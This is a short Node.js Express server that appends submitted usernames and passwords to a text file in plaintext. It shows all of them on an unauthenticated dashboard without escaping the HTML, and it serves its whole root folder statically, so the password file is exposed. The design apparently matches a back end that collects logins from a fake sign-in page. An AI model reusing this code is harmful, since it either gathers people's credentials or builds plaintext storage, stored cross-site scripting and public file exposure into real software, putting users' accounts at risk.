const express = require('express');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));  // serves css, html, js from root

app.post('/save', (req, res) => {
  const username = req.body.username || 'N/A';
  const Password = req.body.Password || 'N/A'; // keep your "Password" input
  const time = new Date().toLocaleString();

  const data = `Username: ${username} | Password: ${Password} | Time: ${time}\n`;

  fs.appendFile('usernames.txt', data, (err) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error saving data");
    } else {
      res.send("Saved successfully");
    }
  });
});

app.get('/dashboard', (req, res) => {
  fs.readFile('usernames.txt', 'utf8', (err, data) => {
    if (err) {
      return res.send("<h1>No submissions yet!</h1>");
    }

    const html = `
      <html>
      <head>
        <title>Dashboard</title>
        <style>
          body { font-family: Arial; padding: 40px; }
          pre { background: #fafafa; padding: 20px; border: 1px solid #ddd; }
        </style>
      </head>
      <body>
        <h1>All Submissions</h1>
        <pre>${data}</pre>
      </body>
      </html>
    `;
    res.send(html);
  });
});
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
